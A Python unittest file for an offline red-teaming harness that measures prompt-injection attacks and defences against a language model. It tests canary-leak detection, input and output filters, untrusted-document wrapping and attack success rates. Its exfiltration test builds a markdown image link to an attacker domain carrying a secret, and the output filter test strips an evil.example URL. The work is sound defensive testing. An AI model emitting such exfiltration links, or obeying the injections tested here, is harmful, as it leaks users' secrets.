"""Offline tests (no network, no API keys). Run:  python -m unittest discover -s tests -v"""
import unittest

from redteam.attacks import ATTACKS, BENIGN, AttackInput, judge
from redteam.context import make_ctx
from redteam.defenses import DEFENSES, filter_output, scan_text
from redteam.evaluator import RunConfig, run, wilson
from redteam.target import DEFAULT_SYSTEM, prepare

CTX = make_ctx(1337)


class TestJudge(unittest.TestCase):
    def test_leak_variants(self):
        self.assertTrue(judge("leak", f"key is {CTX.canary}", CTX)[0])
        self.assertTrue(judge("leak", " ".join(CTX.canary), CTX)[0])          # spelled out
        self.assertTrue(judge("leak", CTX.canary[::-1], CTX)[0])              # reversed
        self.assertFalse(judge("leak", "I can't share that.", CTX)[0])

    def test_marker_in_refusal_not_counted(self):
        self.assertTrue(judge("marker", CTX.marker, CTX)[0])
        self.assertFalse(judge("marker", f"Sorry, I won't say {CTX.marker}.", CTX)[0])

    def test_exfil_needs_data(self):
        good = f"![x](https://{CTX.attacker_domain}/p?d={CTX.canary})"
        bare = f"![x](https://{CTX.attacker_domain}/p)"
        self.assertTrue(judge("exfil", good, CTX)[0])
        self.assertFalse(judge("exfil", bare, CTX)[0])


class TestFilters(unittest.TestCase):
    def test_input_filter_catches_obfuscation(self):
        for a in ATTACKS:
            if a.id in ("OB-01", "OB-02", "OB-03", "OB-04", "DI-01", "PE-01"):
                self.assertIsNotNone(scan_text(a.build(CTX).user), a.id)

    def test_input_filter_known_gaps_and_false_positives(self):
        self.assertIsNone(scan_text(next(a for a in ATTACKS if a.id == "DI-04").build(CTX).user))
        fp = [b for b in BENIGN if b.id in ("B-07", "B-08")]
        self.assertTrue(all(scan_text(b.user) for b in fp))                   # documented over-blocking
        clean = [b for b in BENIGN if b.id not in ("B-07", "B-08")]
        self.assertFalse(any(scan_text(b.user) or scan_text(b.doc or "") for b in clean))

    def test_output_filter(self):
        out, why = filter_output(f"key {CTX.canary}", CTX)
        self.assertEqual(why, "canary-in-output")
        out, why = filter_output("see https://evil.example/x and https://acme.example/ok", CTX)
        self.assertIn("acme.example/ok", out)
        self.assertNotIn("evil.example", out)


class TestPipeline(unittest.TestCase):
    def test_forged_history_blocked(self):
        a = next(x for x in ATTACKS if x.id == "FH-01").build(CTX)
        prep = prepare(DEFAULT_SYSTEM, CTX, DEFENSES["input_filter"], a.user, a.doc, a.history)
        self.assertIsNone(prep.messages)

    def test_hardened_wraps_untrusted(self):
        prep = prepare(DEFAULT_SYSTEM, CTX, DEFENSES["hardened_prompt"], "hi", "doc text")
        self.assertIn("<untrusted_document>", prep.messages[-1]["content"])
        self.assertIn("SECURITY POLICY", prep.messages[0]["content"])

    def test_wilson(self):
        lo, hi = wilson(5, 10)
        self.assertTrue(0.2 < lo < 0.5 < hi < 0.8)
        self.assertEqual(wilson(0, 0), (0.0, 0.0))

    def test_end_to_end_mock_defenses_help(self):
        cfg = RunConfig(["mock:vulnerable"], ["none", "layered"], trials=4, workers=1)
        s = run(cfg, quiet=True)["summary"]["mock:vulnerable"]
        self.assertGreater(s["none"]["asr"], 0.5)
        self.assertLess(s["layered"]["asr"], s["none"]["asr"])
        self.assertGreater(s["none"]["utility"], s["layered"]["utility"])     # filter over-blocks


if __name__ == "__main__":
    unittest.main()
